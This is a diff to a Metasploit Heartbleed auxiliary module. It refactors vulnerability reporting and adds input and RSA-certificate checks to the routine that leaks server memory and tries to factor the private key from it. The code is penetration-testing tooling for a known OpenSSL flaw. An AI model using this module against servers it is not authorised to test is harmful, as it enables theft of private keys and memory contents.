@@ -528,6 +528,17 @@ class MetasploitModule < Msf::Auxiliary
     payload
   end
 
+  # Keep exposure reporting independent of raw-memory and private-key loot.
+  def report_heartbleed
+    report_vuln({
+      :host => rhost,
+      :port => rport,
+      :name => self.name,
+      :refs => self.references,
+      :info => "Module #{self.fullname} successfully leaked info"
+    })
+  end
+
   # Stores received data
   def loot_and_report(heartbeat_data)
     if heartbeat_data.to_s.empty?
@@ -536,13 +547,7 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     print_good("Heartbeat response with leak, #{heartbeat_data.length} bytes")
-    report_vuln({
-      :host => rhost,
-      :port => rport,
-      :name => self.name,
-      :refs => self.references,
-      :info => "Module #{self.fullname} successfully leaked info"
-    })
+    report_heartbleed
 
     if action.name == 'DUMP' # Check mode, dump if requested.
       pattern = dumpfilter
@@ -585,6 +590,11 @@ class MetasploitModule < Msf::Auxiliary
 
   # Tries to retrieve the private key
   def get_keys
+    unless status_every.to_i.positive?
+      print_error('STATUS_EVERY must be greater than 0 for KEYS')
+      return
+    end
+
     connect_result = establish_connect
     disconnect
     return if connect_result.nil?
@@ -597,6 +607,7 @@ class MetasploitModule < Msf::Auxiliary
 
     if n.nil? || e.nil?
       print_error("Failed to get public key, aborting.")
+      return
     end
 
     vprint_status("n: #{n}")
@@ -610,8 +621,9 @@ class MetasploitModule < Msf::Auxiliary
       end
 
       bleedresult = bleed
-      return unless bleedresult
+      return if bleedresult.to_s.empty?
 
+      report_heartbleed if count.zero?
       p, q = get_factors(bleedresult, n) # Try to find factors in mem
 
       unless p.nil? || q.nil?
@@ -642,7 +654,14 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
 
-    return @cert.public_key.params['n'], @cert.public_key.params['e']
+    public_key = @cert.public_key
+    unless public_key.is_a?(OpenSSL::PKey::RSA)
+      print_error('KEYS requires an RSA certificate; use SCAN or DUMP for other key types')
+      return
+    end
+
+    params = public_key.params
+    [params['n'], params['e']]
   end
 
   # Tries to find pieces of the private key in the provided data
